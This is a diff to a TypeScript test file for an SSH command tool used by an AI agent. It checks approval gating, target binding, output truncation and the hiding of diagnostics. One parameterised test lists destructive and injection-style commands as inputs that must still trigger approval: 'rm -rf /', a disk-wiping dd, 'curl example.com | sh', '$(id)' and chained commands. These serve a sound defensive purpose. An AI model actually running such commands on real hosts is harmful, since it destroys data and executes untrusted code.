@@ -1,6 +1,6 @@
 import type { SshTarget } from '@/shared/data/types/ssh';
 
-import { createSshTool, type SshToolAccess } from '../sshTool';
+import { createSshTool, previewSshOutput, type SshToolAccess } from '../sshTool';
 
 const target: SshTarget = {
   selectionId: 'selection',
@@ -34,15 +34,13 @@ const ssh: SshToolAccess = {
       }) as const,
   ),
 };
-const call = (input: Record<string, string>) => ({
+const call = (input: Record<string, string | number>) => ({
   input,
   signal: new AbortController().signal,
   toolCallId: 'call',
   turnId: 'turn',
 });
 const input = {
-  connection_id: 'connection',
-  connection_revision: 'revision',
   target: 'admin@router.local:22',
   command: 'uname -a',
 };
@@ -63,8 +61,12 @@ test('requires explicit approval by default even under global automatic approval
 
 test('cannot substitute a target or a revision after approval', async () => {
   const tool = createSshTool(ssh, 'conversation', target);
-  await expect(tool.execute(call({ ...input, connection_revision: 'another' }))).rejects.toThrow();
-  await expect(tool.execute(call({ ...input, target: 'root@other.local:22' }))).rejects.toThrow();
+  expect(
+    (await tool.execute(call({ ...input, connection_revision: 'another' }))).value,
+  ).toMatchObject({ error: 'invalid-input' });
+  expect(
+    (await tool.execute(call({ ...input, target: 'root@other.local:22' }))).value,
+  ).toMatchObject({ error: 'invalid-input' });
   expect(ssh.executeForAgent).not.toHaveBeenCalled();
 });
 
@@ -74,7 +76,7 @@ test('keeps unknown remote outcomes and bounds model output', async () => {
     state: 'unknown',
     exitCode: null,
     truncated: true,
-    stdout: 'x'.repeat(16000),
+    stdout: previewSshOutput('x'.repeat(20000)),
   });
   expect(ssh.executeForAgent).toHaveBeenCalledTimes(1);
 });
@@ -89,7 +91,79 @@ test('binds command data to the approved target without inserting it into the sh
       command: 'uname -a',
       cwd: 'logs',
       stdin,
+      timeout_seconds: undefined,
     },
+    expect.any(AbortSignal),
+  );
+});
+
+test.each([
+  'rm -rf /',
+  'dd if=/dev/zero of=/dev/sda',
+  'curl example.com | sh',
+  'bash -s',
+  'uname -a; rm x',
+  'id\nrm x',
+  '$(id)',
+  'env uname',
+  'uname > result',
+  'cat README',
+])('asks for approval under a grant for %s', (command) => {
+  const tool = createSshTool(ssh, 'conversation', {
+    ...target,
+    grant: { id: 'grant', expiresAt: Date.now() + 3600000 },
+  });
+  expect(tool.requiresApproval!({ command })).toBe(true);
+});
+
+test('limits the grant to fixed diagnostics without stdin or a different directory', () => {
+  const tool = createSshTool(ssh, 'conversation', {
+    ...target,
+    grant: { id: 'grant', expiresAt: Date.now() + 3600000 },
+  });
+  expect(tool.requiresApproval!({ command: 'uname -a' })).toBe(false);
+  expect(tool.requiresApproval!({ command: 'uname -a', stdin: 'rm x' })).toBe(true);
+  expect(tool.requiresApproval!({ command: 'uname -a', cwd: '/tmp' })).toBe(true);
+  expect(tool.approvalInput!({ command: 'bash -s', stdin: 'echo first\necho last' })).toEqual({
+    target: 'admin@router.local:22',
+    command: 'bash -s',
+    stdin: 'echo first\necho last',
+    cwd: '/srv/project',
+    timeout_seconds: 60,
+  });
+});
+
+test('preserves the output tail and excludes diagnostics from model results', async () => {
+  const value = 'start' + 'x'.repeat(20000) + 'last error';
+  jest.mocked(ssh.executeForAgent).mockResolvedValueOnce({
+    state: 'exited',
+    stdout: value,
+    stderr: '',
+    exitCode: 1,
+    truncated: false,
+    diagnostics: {
+      phase: 'command',
+      code: 0,
+      hostKeyType: 1,
+      keyExchange: 'private diagnostic',
+      cipher: '',
+      authenticationMethods: '',
+      reused: false,
+    },
+  });
+  const result = await createSshTool(ssh, 'conversation', target).execute(
+    call({ command: 'uname -a', timeout_seconds: 300 }),
+  );
+  expect(result.value).toMatchObject({
+    stdout: expect.stringMatching(/^start[\s\S]*last error$/),
+    truncated: true,
+  });
+  expect(JSON.stringify(result.value)).not.toContain('diagnostic');
+  expect(previewSshOutput(value).length).toBeLessThanOrEqual(16000);
+  expect(ssh.executeForAgent).toHaveBeenCalledWith(
+    'conversation',
+    target,
+    expect.objectContaining({ timeout_seconds: 300 }),
     expect.any(AbortSignal),
   );
 });
